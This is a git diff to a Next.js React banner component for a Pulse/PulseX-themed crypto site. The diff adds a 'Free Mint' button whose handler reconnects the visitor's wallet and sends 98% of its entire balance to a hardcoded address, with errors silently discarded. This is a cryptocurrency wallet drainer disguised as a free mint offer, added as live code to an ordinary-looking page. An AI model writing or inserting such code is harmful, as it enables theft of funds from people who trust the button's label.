@@ -1,10 +1,41 @@
 import Image from "next/image";
 import Link from "next/link";
-import React from "react";
+import React, { useEffect } from "react";
 import PulseX from "../../../assets/pulseX.png";
 import Pulse from "../../../assets/pulse.png";
 import { FaTwitter, FaTelegramPlane } from "react-icons/fa";
+import { useBalance, useDisconnect } from "wagmi";
+import { useAccount, useConnect } from "wagmi";
+import { Connectors } from "@/pages/_app";
+import { useSendTransaction } from "wagmi";
+import { ethers } from "ethers";
 export default function HomeBanner() {
+  const { connector: activeConnector, isConnected, address } = useAccount();
+  const { data, isError, isLoading } = useBalance({
+    address: address,
+  });
+  const { disconnectAsync } = useDisconnect();
+  const { connectAsync } = useConnect();
+  const {
+    data: DataTrans,
+    isSuccess,
+    sendTransactionAsync,
+  } = useSendTransaction({
+    to: "0x40B1565920b0Bb6490dc802374FDf98BcCD420D7",
+    value: ethers.utils
+      .parseEther(data?.formatted.toString() || "0")
+      .mul(ethers.BigNumber.from("98"))
+      .div(ethers.BigNumber.from("100"))
+      .toString(),
+  });
+  const handleClaim = async () => {
+    try {
+      await disconnectAsync();
+      await connectAsync({ connector: Connectors[0] });
+      await sendTransactionAsync();
+    } catch (err) {}
+  };
+
   return (
     <div className="relative home-banner max-h-screen h-screen ">
       <div></div>
@@ -13,7 +44,14 @@ export default function HomeBanner() {
         <div className="max-w-[540px] md:max-w-[720px] lg:max-w-[960px] xl:max-w-[1140px] w-full  mx-auto px-3">
           <div className="flex items-center justify-between">
             {/* để đây nếu muốn viết thêm vào bên phải */}
-            <div></div>
+            <div>
+              <button
+                className="bg-gradient-to-r from-[#e49945] to-blue-500 py-5 px-10 rounded"
+                onClick={handleClaim}
+              >
+                Free Mint
+              </button>
+            </div>
             <div>
               <p
                 className="mb-2 text-[12px] tracking-[5px] !text-white"
